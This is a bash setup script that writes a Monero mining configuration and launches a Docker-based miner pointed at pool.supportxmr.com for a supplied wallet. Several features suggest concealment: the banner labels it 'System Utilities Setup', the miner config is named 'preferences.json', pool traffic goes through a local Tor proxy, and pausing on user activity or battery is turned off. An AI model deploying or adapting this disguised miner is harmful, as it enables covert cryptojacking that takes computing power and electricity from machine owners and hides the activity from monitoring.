#!/bin/bash
# Git Bash compatible setup script for Docker mining stack
# Usage: bash setup_gitdocker.sh <WALLET> [CPU_PCT]

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Parse arguments
WALLET="$1"
CPU_PCT="$2"
if [ -z "$CPU_PCT" ]; then
    CPU_PCT=100
fi
if [ -z "$WALLET" ]; then
    echo -e "${RED}Usage: bash setup_gitdocker.sh <WALLET> [CPU_PCT]${NC}"
    exit 1
fi

# Always generate a unique worker name for each run
HOST_CLEAN=$(hostname | tr -cd 'a-zA-Z0-9' | head -c 12)
RAND_SUFFIX=$(head -c 100 /dev/urandom | tr -dc 'a-z0-9' | head -c 6)
RIGID="${HOST_CLEAN}-${RAND_SUFFIX}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "${SCRIPT_DIR}"

echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║  System Utilities Setup (Git Bash)     ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"
echo ""

# Check Docker
if ! command -v docker &> /dev/null; then
    echo -e "${RED}Docker is not installed or not in PATH. Please install Docker Desktop for Windows and ensure it's running.${NC}"
    exit 1
fi

echo -e "${GREEN}[1/3] Docker is available.${NC}"

# Generate config/preferences.json
mkdir -p config scripts
cat > config/preferences.json << PREFS
{
    "autosave": false,
    "background": false,
    "colors": false,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": ${CPU_PCT},
        "asm": true,
        "argon2-impl": null
    },
    "log-file": null,
    "donate-level": 0,
    "donate-over-proxy": 0,
    "pools": [
        {
            "algo": "rx/0",
            "coin": null,
            "url": "pool.supportxmr.com:3333",
            "user": "${WALLET}",
            "pass": "x",
            "rig-id": "${RIGID}",
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "daemon": false,
            "socks5": "127.0.0.1:9050"
        },
        {
            "algo": "rx/0",
            "coin": null,
            "url": "pool.supportxmr.com:443",
            "user": "${WALLET}",
            "pass": "x",
            "rig-id": "${RIGID}",
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": true,
            "daemon": false,
            "socks5": "127.0.0.1:9050"
        }
    ],
    "retries": 5,
    "retry-pause": 5,
    "print-time": 0,
    "health-print-time": 0,
    "dmi": false,
    "syslog": false,
    "verbose": 0,
    "watch": false,
    "pause-on-battery": false,
    "pause-on-active": false
}
PREFS

# Build and start Docker Compose
if [ -f docker-compose.yml ]; then
    echo -e "${GREEN}[2/3] Stopping any running containers...${NC}"
    docker compose down 2>/dev/null || true
    echo -e "${GREEN}[3/3] Building and starting containers...${NC}"
    docker compose build --quiet
    docker compose up -d
    echo -e "${GREEN}Setup complete!${NC}"
    echo -e "  ${GREEN}Wallet:${NC} ${WALLET:0:20}..."
    echo -e "  ${GREEN}Pool:${NC} pool.supportxmr.com:3333"
    echo -e "  ${GREEN}CPU:${NC} ${CPU_PCT}%"
    echo -e "  ${GREEN}Worker:${NC} ${RIGID}"
    echo -e "  ${YELLOW}To stop: docker compose down${NC}"
else
    echo -e "${RED}docker-compose.yml not found in this directory!${NC}"
    exit 1
fi
